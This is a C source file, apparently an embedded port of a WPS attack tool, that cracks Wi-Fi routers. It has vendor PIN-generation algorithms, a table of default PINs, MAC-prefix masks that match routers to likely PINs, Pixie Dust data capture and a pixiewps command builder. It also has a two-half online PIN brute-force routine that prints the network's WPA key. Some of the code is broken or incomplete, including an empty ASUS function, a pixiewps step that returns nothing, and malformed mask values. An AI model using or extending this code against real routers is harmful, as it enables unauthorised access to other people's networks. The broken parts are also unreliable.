#pragma once
#include "WPSStructs.h"

unsigned char mac_byte(mac_t mac,int byte) {
	return (mac>>(8*byte)) & 0xFF;
}

mac_t str2mac(const char *str) {
	mac_t mac=0x0;
	while(*str!='\0') {
		if(*str>='A' && *str<='F') {
			mac<<=4; /* 1/2 of byte */
			mac+=(*str-'A'+0xA);
		} else if(*str>='a' && *str<='f') {
			mac<<=4;
			mac+=(*str-'a'+0xA);
		} else if(*str>='0' && *str<='9') {
			mac<<=4;
			mac+=(*str-'0');
		} else if(*str!=':')
			return NO_MAC;
		str++;
	}
	return mac;
}

const char *mac2str(mac_t mac) {
	static char str[18];
	unsigned char b[6];
	int byte;
	for(byte=0; byte<6; byte++)
		b[byte]=mac_byte(mac,byte);
	sprintf(str,"%02X:%02X:%02X:%02X:%02X:%02X",
	             b[5],b[4],b[3],b[2],b[1],b[0]);
	return str;
}

pin_t checksum(pin_t pin) {
	int accum=0;
	while(pin) {
		accum+=(3*(pin%10));
		pin/=10;
		accum+=(pin%10);
		pin/=10;
	}
	return ((10-accum%10)%10);
}

pin_t pin24(mac_t mac) {
	return mac & 0xFFFFFF;
}
pin_t pin28(mac_t mac) {
	return mac & 0xFFFFFFF;
}
pin_t pin32(mac_t mac) {
	return mac % 0x100000000;
}

pin_t pinDLink(mac_t mac) {
	pin_t nic = pin24(mac);
	pin_t pin = nic ^ 0x55AA55;
	pin ^= (((pin & 0xF) << 4) +
			((pin & 0xF) << 8) +
			((pin & 0xF) << 12) +
			((pin & 0xF) << 16) +
			((pin & 0xF) << 20));
	pin%=1000000;
	if(pin<100000)
		pin+=((pin%9+1)*100000);
	return pin;
}

pin_t pinDLink1(mac_t mac) {
	return pinDLink(mac+1);
}
pin_t pinASUS(mac_t mac) {

}

pin_t pinAirocon(mac_t mac) {
	unsigned char b[6];
	int byte;
	for(byte=0; byte<6; byte++)
		b[byte]=mac_byte(mac,byte);
	pin_t pin=
		(((b[0] + b[1]) % 10) * 1) +
		(((b[5] + b[0]) % 10) * 10) +
		(((b[4] + b[5]) % 10) * 100) +
		(((b[3] + b[4]) % 10) * 1000) +
		(((b[2] + b[3]) % 10) * 10000) +
		(((b[1] + b[2]) % 10) * 100000) +
		(((b[0] + b[1]) % 10) * 1000000);
	return pin;

}

const algo_t algorithms[]= {
	{"Empty",				EMPTY_PIN,	NULL},
	{"24-bit PIN",			NO_PIN,		pin24},
	{"28-bit PIN",			NO_PIN,		pin28},
	{"32-bit PIN",			NO_PIN,		pin32},
	{"D-Link PIN",			NO_PIN,		pinDLink},
	{"D-Link PIN +1",		NO_PIN,		pinDLink1},
	{"ASUS PIN",			NO_PIN,		pinASUS},
	{"Airocon Realtek",		NO_PIN,		pinAirocon},

	{"Cisco",				1234567,	NULL},
	{"Broadcom 1",			2017252,	NULL},
	{"Broadcom 2",			4626484,	NULL},
	{"Broadcom 3",			7622990,	NULL},
	{"Broadcom 4",			6232714,	NULL},
	{"Broadcom 5",			1086411,	NULL},
	{"Broadcom 6",			3195719,	NULL},
	{"Aircocon 1",			3043203,	NULL},
	{"Aircocon 2",			7141225,	NULL},
	{"DSL-2740R",			6817554,	NULL},
	{"Realtek 1",			9566146,	NULL},
	{"Realtek 2",			9571911,	NULL},
	{"Realtek 3",			4856371,	NULL},
	{"Upvel",				2085483,	NULL},
	{"UR-814AC",			4397768,	NULL},
	{"UR-825AC",			529417,		NULL},
	{"Onlime",				9995604,	NULL},
	{"Edimax",				3561153,	NULL},
	{"Thomson",				6795814,	NULL},
	{"HG532x",				3425928,	NULL},
	{"H108L",				9422988,	NULL},
	{"CBN ONO",				9575521,	NULL},
};

pin_t generate_pin(int algo,mac_t mac) {
	pin_t pin;
	if(algorithms[algo].gen)
		pin=algorithms[algo].gen(mac);
	else
		pin=algorithms[algo].static_pin;
	pin=pin%10000000*10+checksum(pin);
	return pin;
}
int matches(mac_t mac, mac_t _mask) {
	int byte;
	for(byte=6; byte>=0; byte--) {
		if(mac_byte(_mask,byte)==0xFF) {
			mac_t shift=mac>>(8*(6-byte));
			mac_t mask=_mask & ~(0xFF<<(byte*8));
			return shift==mask;
		}
	}
	return 0;
}

unsigned long long int suggest(mac_t mac) {
	const mac_t masks[][256]= {
		{0xFFE46F13, 0xFFEC2280, 0xFF58D56E, 0xFF1062EB, 0xFF10BEF5, 0xFF1C5F2B, 0xFF802689, 0xFFA0AB1B, 0xFF74DADA, 0xFF9CD643, 0xFF68A0F6, 0xFF0C96BF, 0xFF20F3A3, 0xFFACE215, 0xFFC8D15E, 0xFF000E8F, 0xFFD42122, 0xFF3C9872, 0xFF788102, 0xFF7894B4, 0xFFD460E3, 0xFFE06066, 0xFF004A77, 0xFF2C957F, 0xFF64136C, 0xFF74A78E, 0xFF88D274, 0xFF702E22, 0xFF74B57E, 0xFF789682, 0xFF7C3953, 0xFF8C68C8, 0xFFD476EA, 0xFF344DEA, 0xFF38D82F, 0xFF54BE53, 0xFF709F2D, 0xFF94A7B7, 0xFF981333, 0xFFCAA366, 0xFFD0608C, 0x0},
		{0xFF04BF6D, 0xFF0E5D4E, 0xFF107BEF, 0xFF14A9E3, 0xFF28285D, 0xFF2A285D, 0xFF32B2DC, 0xFF381766, 0xFF404A03, 0xFF4E5D4E, 0xFF5067F0, 0xFF5CF4AB, 0xFF6A285D, 0xFF8E5D4E, 0xFFAA285D, 0xFFB0B2DC, 0xFFC86C87, 0xFFCC5D4E, 0xFFCE5D4E, 0xFFEA285D, 0xFFE243F6, 0xFFEC43F6, 0xFFEE43F6, 0xFFF2B2DC, 0xFFFCF528, 0xFFFEF528, 0xFF4C9EFF, 0xFF0014D1, 0xFFD8EB97, 0xFF1C7EE5, 0xFF84C9B2, 0xFFFC7516, 0xFF14D64D, 0xFF9094E4, 0xFFBCF685, 0xFFC4A81D, 0xFF00664B, 0xFF087A4C, 0xFF14B968, 0xFF2008ED, 0xFF346BD3, 0xFF4CEDDE, 0xFF786A89, 0xFF88E3AB, 0xFFD46E5C, 0xFFE8CD2D, 0xFFEC233D, 0xFFECCB30, 0xFFF49FF3, 0xFF20CF30, 0xFF90E6BA, 0xFFE0CB4E, 0xFFD4BF7F4, 0xFFF8C091, 0xFF001CDF, 0xFF002275, 0xFF08863B, 0xFF00B00C, 0xFF081075, 0xFFC83A35, 0xFF0022F7, 0xFF001F1F, 0xFF00265B, 0xFF68B6CF, 0xFF788DF7, 0xFFBC1401, 0xFF202BC1, 0xFF308730, 0xFF5C4CA9, 0xFF62233D, 0xFF623CE4, 0xFF623DFF, 0xFF6253D4, 0xFF62559C, 0xFF626BD3, 0xFF627D5E, 0xFF6296BF, 0xFF62A8E4, 0xFF62B686, 0xFF62C06F, 0xFF62C61F, 0xFF62C714, 0xFF62CBA8, 0xFF62CDBE, 0xFF62E87B, 0xFF6416F0, 0xFF6A1D67, 0xFF6A233D, 0xFF6A3DFF, 0xFF6A53D4, 0xFF6A559C, 0xFF6A6BD3, 0xFF6A96BF, 0xFF6A7D5E, 0xFF6AA8E4, 0xFF6AC06F, 0xFF6AC61F, 0xFF6AC714, 0xFF6ACBA8, 0xFF6ACDBE, 0xFF6AD15E, 0xFF6AD167, 0xFF721D67, 0xFF72233D, 0xFF723CE4, 0xFF723DFF, 0xFF7253D4, 0xFF72559C, 0xFF726BD3, 0xFF727D5E, 0xFF7296BF, 0xFF72A8E4, 0xFF72C06F, 0xFF72C61F, 0xFF72C714, 0xFF72CBA8, 0xFF72CDBE, 0xFF72D15E, 0xFF72E87B, 0xFF0026CE, 0xFF9897D1, 0xFFE04136, 0xFFB246FC, 0xFFE24136, 0xFF00E020, 0xFF5CA39D, 0xFFD86CE9, 0xFFDC7144, 0xFF801F02, 0xFFE47CF9, 0xFF000CF6, 0xFF00A026, 0xFFA0F3C1, 0xFF647002, 0xFFB0487A, 0xFFF81A67, 0xFFF8D111, 0xFF34BA9A, 0xFFB4944E, 0x0},
		{0xFF200BC7, 0xFF4846FB, 0xFFD46AA8, 0xFFF84ABF, 0x0},
		{0xFF000726, 0xFFD8FEE3, 0xFFFC8B97, 0xFF1062EB, 0xFF1C5F2B, 0xFF48EE0C, 0xFF802689, 0xFF908D78, 0xFFE8CC18, 0xFF2CAB25, 0xFF10BF48, 0xFF14DAE9, 0xFF3085A9, 0xFF50465D, 0xFF5404A6, 0xFFC86000, 0xFFF46D04, 0xFF3085A9, 0xFF801F02, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFA0AB1B, 0xFFB8A386, 0xFFC0A0BB, 0xFFCCB255, 0xFFFC7516, 0xFF0014D1, 0xFFD8EB97, 0x0},
		{0xFF0018E7, 0xFF00195B, 0xFF001CF0, 0xFF001E58, 0xFF002191, 0xFF0022B0, 0xFF002401, 0xFF00265A, 0xFF14D64D, 0xFF1C7EE5, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFB8A386, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFF0014D1, 0x0},
		{0xFF049226, 0xFF04D9F5, 0xFF08606E, 0xFF0862669, 0xFF107B44, 0xFF10BF48, 0xFF10C37B, 0xFF14DDA9, 0xFF1C872C, 0xFF1CB72C, 0xFF2C56DC, 0xFF2CFDA1, 0xFF305A3A, 0xFF382C4A, 0xFF38D547, 0xFF40167E, 0xFF50465D, 0xFF54A050, 0xFF6045CB, 0xFF60A44C, 0xFF704D7B, 0xFF74D02B, 0xFF7824AF, 0xFF88D7F6, 0xFF9C5C8E, 0xFFAC220B, 0xFFAC9E17, 0xFFB06EBF, 0xFFBCEE7B, 0xFFC860007, 0xFFD017C2, 0xFFD850E6, 0xFFE03F49, 0xFFF0795978, 0xFFF832E4, 0xFF00072624, 0xFF0008A1D3, 0xFF00177C, 0xFF001EA6, 0xFF00304FB, 0xFF00E04C0, 0xFF048D38, 0xFF081077, 0xFF081078, 0xFF081079, 0xFF083E5D, 0xFF10FEED3C, 0xFF181E78, 0xFF1C4419, 0xFF2420C7, 0xFF247F20, 0xFF2CAB25, 0xFF3085A98C, 0xFF3C1E04, 0xFF40F201, 0xFF44E9DD, 0xFF48EE0C, 0xFF5464D9, 0xFF54B80A, 0xFF587BE906, 0xFF60D1AA21, 0xFF64517E, 0xFF64D954, 0xFF6C198F, 0xFF6C7220, 0xFF6CFDB9, 0xFF78D99FD, 0xFF7C2664, 0xFF803F5DF6, 0xFF84A423, 0xFF88A6C6, 0xFF8C10D4, 0xFF8C882B00, 0xFF904D4A, 0xFF907282, 0xFF90F65290, 0xFF94FBB2, 0xFFA01B29, 0xFFA0F3C1E, 0xFFA8F7E00, 0xFFACA213, 0xFFB85510, 0xFFB8EE0E, 0xFFBC3400, 0xFFBC9680, 0xFFC891F9, 0xFFD00ED90, 0xFFD084B0, 0xFFD8FEE3, 0xFFE4BEED, 0xFFE894F6F6, 0xFFEC1A5971, 0xFFEC4C4D, 0xFFF42853, 0xFFF43E61, 0xFFF46BEF, 0xFFF8AB05, 0xFFFC8B97, 0xFF7062B8, 0xFF78542E, 0xFFC0A0BB8C, 0xFFC412F5, 0xFFC4A81D, 0xFFE8CC18, 0xFFEC2280, 0xFFF8E903F4, 0x0},
		{0xFF0007262F, 0xFF000B2B4A, 0xFF000EF4E7, 0xFF001333B, 0xFF00177C, 0xFF001AEF, 0xFF00E04BB3, 0xFF02101801, 0xFF0810734, 0xFF08107710, 0xFF1013EE0, 0xFF2CAB25C7, 0xFF788C54, 0xFF803F5DF6, 0xFF94FBB2, 0xFFBC9680, 0xFFF43E61, 0xFFFC8B97, 0x0},
		{0xFF001A2B, 0xFF00248C, 0xFF002618, 0xFF344DEB, 0xFF7071BC, 0xFFE06995, 0xFFE0CB4E, 0xFF7054F5, 0x0},
		{0xFFACF1DF, 0xFFBCF685, 0xFFC8D3A3, 0xFF988B5D, 0xFF001AA9, 0xFF14144B, 0xFFEC6264, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFF7C034C, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF14D64D, 0xFF1C7EE5, 0xFF28107B, 0xFF84C9B2, 0xFFB8A386, 0xFFBCF685, 0xFFC8BE19, 0xFFC8D3A3, 0xFFCCB255, 0xFFFC7516, 0xFF204E7F, 0xFF4C17EB, 0xFF18622C, 0xFF7C03D8, 0xFFD86CE9, 0x0},
		{0xFF181E78, 0xFF40F201, 0xFF44E9DD, 0xFFD084B0, 0x0},
		{0xFF84A423, 0xFF8C10D4, 0xFF88A6C6, 0x0},
		{0xFF00265A, 0xFF1CBDB9, 0xFF340804, 0xFF5CD998, 0xFF84C9B2, 0xFFFC7516, 0x0},
		{0xFF0014D1, 0xFF000C42, 0xFF000EE8, 0x0},
		{0xFF007263, 0xFFE4BEED, 0x0},
		{0xFF08C6B3, 0x0},
		{0xFF784476, 0xFFD4BF7F0, 0xFFF8C091, 0x0},
		{0xFFD4BF7F60, 0x0},
		{0xFFD4BF7F5, 0x0},
		{0xFFD4BF7F, 0xFFF8C091, 0xFF144D67, 0xFF784476, 0xFF0014D1, 0x0},
		{0xFF801F02, 0xFF00E04C, 0x0},
		{0xFF002624, 0xFF4432C8, 0xFF88F7C7, 0xFFCC03FA, 0x0},
		{0xFF00664B, 0xFF086361, 0xFF087A4C, 0xFF0C96BF, 0xFF14B968, 0xFF2008ED, 0xFF2469A5, 0xFF346BD3, 0xFF786A89, 0xFF88E3AB, 0xFF9CC172, 0xFFACE215, 0xFFD07AB5, 0xFFCCA223, 0xFFE8CD2D, 0xFFF80113, 0xFFF83DFF, 0x0},
		{0xFF4C09B4, 0xFF4CAC0A, 0xFF84742A4, 0xFF9CD24B, 0xFFB075D5, 0xFFC864C7, 0xFFDC028E, 0xFFFCC897, 0x0},
		{0xFF5C353B, 0xFFDC537C, 0x0}
	};
	unsigned long long int bytes=0;
	int type;
	for(type=0; type<PIN_TYPES_COUNT; type++) {
		const mac_t *mask;
		for(mask=masks[type]; *mask; mask++)
			if(matches(mac,*mask))
				bytes|=(1<<type);
	}
	return bytes;
}

pin_t get_likely(mac_t mac) {
	unsigned long long int bytes=suggest(mac);
	int type;
	for(type=0; type<PIN_TYPES_COUNT; type++)
		if((bytes>>type)&1)
			return generate_pin(type,mac);
	return NO_PIN;
}

size_t count_lines(FILE *file) {
	size_t lines=1;
	while(!feof(file)) {
		int ch = fgetc(file);
		if(ch == '\n') {
			lines++;
		}
	}
	rewind(file);
	return lines;
}

int got_all_pixieps_data(const pixiewps_data_t *data) {
	return *data->pke!='\0' && *data->pkr!='\0' && *data->authkey!='\0' &&
	       *data->e_hash1!='\0' && *data->e_hash2!='\0' && *data->e_nonce!='\0';
}
void get_pixiewps_cmd(const pixiewps_data_t *data,int full_range,char *buf) {
	sprintf(buf,"pixiewps --pke %s --pkr %s --e-hash1 %s"
	        " --e-hash2 %s --authkey %s --e-nonce %s %s",
	        data->pke,data->pkr,data->e_hash1,data->e_hash2,
	        data->authkey,data->e_nonce,full_range?"--force":"");
}

void display_bruteforce_status(bruteforce_status_t *status) {
	struct tm *timeinfo;
	timeinfo=localtime(&status->start_time);
	char start_time[128];
	strftime(start_time,128,"%Y-%m-%d %H:%M:%S",timeinfo);

	double mean=0.0;
	int count=0;
	size_t n;
	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT; n++) {
		if(status->attempts_times[n]==0.0f) {
			mean+=status->attempts_times[n];
			count++;
		}
	}
	mean/=(double)count;

	float percent;
	if(status->mask<10000)
		percent=status->mask/110.0f;
	else
		percent=(1000.0f/11.0f)+(status->mask%10000)/110.0f;

	Serial.printf("[*] %.2f%% complete @ %s (%.2f seconds/pin)\n",
	        percent,start_time,mean);
}

void register_bruteforce_attempt(bruteforce_status_t *status, pin_t mask) {
	status->mask=mask;
	status->counter++;
	time_t current_time;
	time(&current_time);
	double diff=difftime(current_time,status->last_attempt_time);
	int n;
	for(n=0; n<BRUTEFORCE_STATISTICS_COUNT-1; n++) /* shift times */
		status->attempts_times[n]=status->attempts_times[n+1];
	status->attempts_times[BRUTEFORCE_STATISTICS_COUNT-1]=diff;
	if(status->counter%BRUTEFORCE_STATISTICS_PERIOD==0)
		display_bruteforce_status(status);
}

int wpa_ctrl_open(wpa_ctrl_t *ctrl){
	static int counter=0;
	ctrl->s=socket(AF_INET,SOCK_DGRAM,0);
	if(ctrl->s<0){
		Serial.printf("socket Error");
		return -1;
	}
	ctrl->local.sin_family=AF_INET;
	if(bind(ctrl->s,(struct sockaddr*)&ctrl->local,sizeof(struct sockaddr_in))){
		Serial.printf("bind error");
		return -1;
	}

	ctrl->dest.sin_family=AF_INET;
	if(connect(ctrl->s,(struct sockaddr*)&ctrl->dest,sizeof(struct sockaddr_in))){
		Serial.printf("connect error");
		return -1;
	}
	return 0;
}

void wpa_ctrl_close(wpa_ctrl_t *ctrl){
	close(ctrl->s);
}

int wpa_ctrl_send(wpa_ctrl_t *ctrl,const char *input){
	if(send(ctrl->s,input,strlen(input),0)<0){
		Serial.printf("send error");
		return -1;
	}
	return 0;
}

int wpa_ctrl_send_recv(wpa_ctrl_t *ctrl,const char *input,char *output,size_t len){
	if(wpa_ctrl_send(ctrl,input))
		return -1;
	if(recv(ctrl->s,output,len,0)<0){
		Serial.printf("recv error");
		return -1;
	}
	return 0;
}

void init(data_t *data){
    wpa_ctrl_open(&data->ctrl);
}

void credential_print(pin_t pin,const char *psk,const char *essid){
	Serial.printf("[+] WPS PIN: %08u\n",pin);
	Serial.printf("[+] WPA PSK: %s\n",  psk);
	Serial.printf("[+] AP SSID: %s\n",  essid);
}

void remove_spaces(char* s) {
    char* d = s;
    do {
        while (*d == ' ') {
            ++d;
        }
    } while (*s++ = *d++);
}

int handle_wpas(data_t *data,int pixiemode,mac_t bssid){
	connection_status_t *status=&data->connection_status;
	pixiewps_data_t *pixie=&data->pixiewps_data;
	char line[1024];
	fgets(line,1024,data->wpas);
	if(*line=='\0'){
		return -1;
	}
	if(data->print_debug)
		Serial.printf("%s",line);
	if(strstr(line,"WPS: ")){
		if(sscanf(line,"WPS: Building Message M%d",&status->last_m_message)==1)
			Serial.printf("[*] Building Message M%d\n",status->last_m_message);
		else if(sscanf(line,"WPS: Received M%d",&status->last_m_message)==1)
			Serial.printf("[*] Received WPS Message M%d\n",status->last_m_message);
		else if(strstr(line,"WSC_NACK")){
			status->status=STATUS_WSC_NACK;
			Serial.printf("[*] Received WSC NACK\n");
			Serial.printf("[-] Error: wrong PIN code\n");
		}else if(strstr(line,"hexdump")){
			size_t psk_len;
			char psk_hex[256];
			if(sscanf(line,"WPS: Enrollee Nonce - hexdump(len=16): %[^\n]s",pixie->e_nonce)==1){
				remove_spaces(pixie->e_nonce);
				if(pixiemode)
					Serial.printf("[P] E-Nonce: %s\n",pixie->e_nonce);
			}else if(sscanf(line,"WPS: DH own Public Key - hexdump(len=192): %[^\n]s",pixie->pkr)==1){
				remove_spaces(pixie->pkr);
				if(pixiemode)
					Serial.printf("[P] PKR: %s\n",pixie->pkr);
			}else if(sscanf(line,"WPS: DH peer Public Key - hexdump(len=192): %[^\n]s",pixie->pke)==1){
				remove_spaces(pixie->pke);
				if(pixiemode)
					Serial.printf("[P] PKE: %s\n",pixie->pke);
			}else if(sscanf(line,"WPS: AuthKey - hexdump(len=32): %[^\n]s",pixie->authkey)==1){
				remove_spaces(pixie->authkey);
				if(pixiemode)
					Serial.printf("[P] Authkey: %s\n",pixie->authkey);
			}else if(sscanf(line,"WPS: E-Hash1 - hexdump(len=32): %[^\n]s",pixie->e_hash1)==1){
				remove_spaces(pixie->e_hash1);
				if(pixiemode)
					Serial.printf("[P] E-Hash1: %s\n",pixie->e_hash1);
			}else if(sscanf(line,"WPS: E-Hash2 - hexdump(len=32): %[^\n]s",pixie->e_hash2)==1){
				remove_spaces(pixie->e_hash2);
				if(pixiemode)
					Serial.printf("[P] E-Hash2: %s\n",pixie->e_hash2);
			}else if(sscanf(line,"WPS: Network Key - hexdump(len=%u): %[^\n]s",&psk_len,psk_hex)==2){
				status->status=STATUS_GOT_PSK;
				size_t n;
				for(n=0;n<psk_len;n++){
					char *p=psk_hex+n*3;
					int input;
					sscanf(p,"%02X",&input);
					status->wpa_psk[n]=input;
				}
				status->wpa_psk[psk_len]='\0';
			}
		}
	}else if(strstr(line,": State: ") && strstr(line,"-> SCANNING")){
		status->status=STATUS_SCANNING;
		Serial.printf("[*] Scanning...\n");
	}else if(strstr(line,"WPS-FAIL") && status->status!=STATUS_NO){
		status->status=STATUS_WPS_FAIL;
		Serial.printf("[-] wpa_supplicant returned WPS-FAIL\n");
	}else if(strstr(line,"Trying to authenticate with")){
		status->status=STATUS_AUTHENTICATING;
		if(strstr(line,"SSID")){
			char *str=strstr(line,"'");
			sscanf(str,"'%s'",status->essid);
		}
		Serial.printf("[*] Authenticating...\n");
	}else if(strstr(line,"Authentication response"))
		Serial.printf("[+] Authenticated\n");
	else if(strstr(line,"Trying to associate with")){
		status->status=STATUS_ASSOCIATING;
		if(strstr(line,"SSID")){
			char *str=strstr(line,"'")+1;
			char *p=str;
			while(*p!='\'')p++; *p='\0';
			strcpy(status->essid,str);
		}
		Serial.printf("[*] Associating with AP...\n");
	}else if(strstr(line,"Associated with") &&
	         strstr(line,data->interface)){
		if(*status->essid!='\0')
			Serial.printf("[+] Associated with %s (ESSID: %s)\n",
				mac2str(bssid),status->essid);
		else
			Serial.printf("[+] Associated with %s\n",mac2str(bssid));
	}else if(strstr(line,"EAPOL: txStart")){
		status->status=STATUS_EAPOL_START;
		Serial.printf("[*] Sending EAPOL Start...\n");
	}else if(strstr(line,"EAP entering state IDENTITY"))
		Serial.printf("[*] Received Identity Request\n");
	else if(strstr(line,"using real identity"))
		Serial.printf("[*] Sending Identity Response...\n");

	return 0;
}

void wps_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode){
	memset(&data->pixiewps_data,0,sizeof(pixiewps_data_t));
	memset(&data->connection_status,0,sizeof(connection_status_t));
	char buf[300]; /* clean pipe */
	Serial.printf("[*] Trying pin %08u...\n",pin);

	char input[256];
	sprintf(input,"WPS_REG %s %08u",mac2str(bssid),pin);
	char output[256];
	wpa_ctrl_send_recv(&data->ctrl,input,output,256);
	if(strstr(output,"OK")==NULL){
		data->connection_status.status=STATUS_WPS_FAIL;
		if(strstr(output,"UNKNOWN COMMAND"))
			fprintf(stderr,"[!] It looks like your wpa_supplicant is "
			       "compiled without WPS protocol support. "
			       "Please build wpa_supplicant with WPS "
			       "support (\"CONFIG_WPS=y\")\n");
		else
			fprintf(stderr,"[!] Something went wrong — check out debug log\n");
		return;
	}
	while(1){
		int res=handle_wpas(data,pixiemode,bssid);
		if(res)
			break;
		if(data->connection_status.status==STATUS_WPS_FAIL)
			break;
		if(data->connection_status.status==STATUS_GOT_PSK)
			break;
		if(data->connection_status.status==STATUS_WSC_NACK)
			break;
	}
	wpa_ctrl_send(&data->ctrl,"WPS_CANCEL");
}

pin_t run_pixiwps(pixiewps_data_t *data, int showcmd,int full_range){
	printf("[*] Running Pixiewps...\n");
	char cmd[2048];
	get_pixiewps_cmd(data,full_range,cmd);
	if(showcmd)
		printf("%s\n",cmd);
	char line[256];
	pin_t pin=NO_PIN;
	char pin_str[10];
	return pin;
}

void single_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode,
			int showpixiesmd,int pixieforce){
	if(pin==NO_PIN){
		if(pixiemode){
			/* Try using the previously calculated PIN */
			pin_t loaded_pin=NO_PIN;
			if(pin==NO_PIN)
				pin=get_likely(bssid);
			if(pin==NO_PIN)
				pin=12345670;
		}
		else 
		{
			Serial.println("No Pixie Mode");
		}
	}
	wps_connection(data,bssid,pin,pixiemode);
	if(data->connection_status.status==STATUS_GOT_PSK){
		credential_print(pin,data->connection_status.wpa_psk,
		                     data->connection_status.essid);
		char pin_path[128];
		sprintf(pin_path,"%s/%017llu.run",data->pixiewps_dir,bssid);
		remove(pin_path);
	}else if(pixiemode){
		if(got_all_pixieps_data(&data->pixiewps_data)){
			pin=run_pixiwps(&data->pixiewps_data,showpixiesmd,pixieforce);
			if(pin!=NO_PIN)
				return single_connection(data,bssid,pin,
						0,showpixiesmd,pixieforce);

		}else
			Serial.printf("[!] Not enough data to run Pixie Dust attack\n");
	}
}

pin_t first_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,int Delay){
	while(f_half<10000){
		pin_t pin=f_half*10000+checksum(f_half*10000);
		single_connection(data,bssid,pin,0,0,0);
		if(data->connection_status.last_m_message>5){
			Serial.printf("[+] First half found\n");
			return f_half;
		}else if(data->connection_status.status==STATUS_WPS_FAIL){
			Serial.printf("[!] WPS transaction failed, re-trying last pin");
			return first_half_bruteforce(data,bssid,f_half,Delay);
		}
		f_half++;
		register_bruteforce_attempt(&data->bruteforce,f_half);
		delay(Delay*1000);
	}
	Serial.printf("[-] First half not found\n");
	return NO_PIN;
}

pin_t second_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,pin_t s_half,int Delay){
	while(s_half<1000){
		pin_t t=f_half*1000+s_half;
		pin_t pin=t*10+checksum(t);
		single_connection(data,bssid,pin,0,0,0);
		if(data->connection_status.last_m_message>6)
			return pin;
		else if(data->connection_status.status==STATUS_WPS_FAIL){
			Serial.printf("[!] WPS transaction failed, re-trying last pin\n");
			return second_half_bruteforce(data, bssid, f_half, s_half, Delay);
		}
		s_half++;
		register_bruteforce_attempt(&data->bruteforce,t);
		delay(Delay*1000);
	}
	return NO_PIN;
}

void smart_bruteforce(data_t *data,mac_t bssid,pin_t start_pin,int delay){
	pin_t mask=0;
	if(start_pin==NO_PIN || start_pin<10000){

	}else
		mask=start_pin/10;

	data->bruteforce=(bruteforce_status_t){0};
	data->bruteforce.mask=mask;
	data->bruteforce.start_time=time(NULL);
	data->bruteforce.last_attempt_time=time(NULL);

	if(mask>=10000){
		pin_t f_half=mask/1000;
		pin_t s_half=mask%1000;
		second_half_bruteforce(data,bssid,f_half,s_half,delay);
	}else{
		pin_t f_half=first_half_bruteforce(data,bssid,mask,delay);
		if(f_half!=NO_PIN && data->connection_status.status!=STATUS_GOT_PSK)
			second_half_bruteforce(data,bssid,f_half,1,delay);
	}
}

network_entry_t read_csv_str(char *str) {
	network_entry_t network;
	char *last=NULL;
	int index=0;
	while(*str) {
		if(last && *str=='"') {
			char c=*str;
			*str='\0';
			switch(index++) {
			case 0: {
				int month;
				struct tm time;
				sscanf(last,"%2d.%2d.%4d %2d:%2d",
				       &time.tm_year,
				       &month,
					   &time.tm_mday,
				       &time.tm_hour,
				       &time.tm_min);
				time.tm_mon=month-1;
				network.time=mktime(&time);
			}
			break;
			case 1:
				network.bssid=str2mac(last);
				break;
			case 2:
				strcpy(network.essid,last);
				break;
			case 3:
				sscanf(last,"%8u",&network.pin);
				break;
			case 4:
				strcpy(network.psk,last);
				break;
			}
			last=NULL;
			*str=c;
		} else if(!last && *str=='"')
			last=str+1;
		str++;
	}
	return network;
}

network_entry_t *read_csv(const char *path,size_t *count) {
	FILE *file=fopen(path,"r");
	if(!file)return NULL;

	size_t lines=count_lines(file);

	network_entry_t *networks=(network_entry_t*)malloc(sizeof(network_entry_t)*(lines-1));
	unsigned int l;
	for(l=0; l<lines; l++) {
		char str[1024];
		fgets(str,1024,file);
		if(l!=0 && *str!='\0')
			networks[l-1]=read_csv_str(str);
	}

	fclose(file);
	if(count)
		*count=lines-1;
	return networks;
}

int compare_network_info(const void *n1, const void *n2) {
	return ((const network_info_t*)n2)->signal-((const network_info_t*)n1)->signal;
}
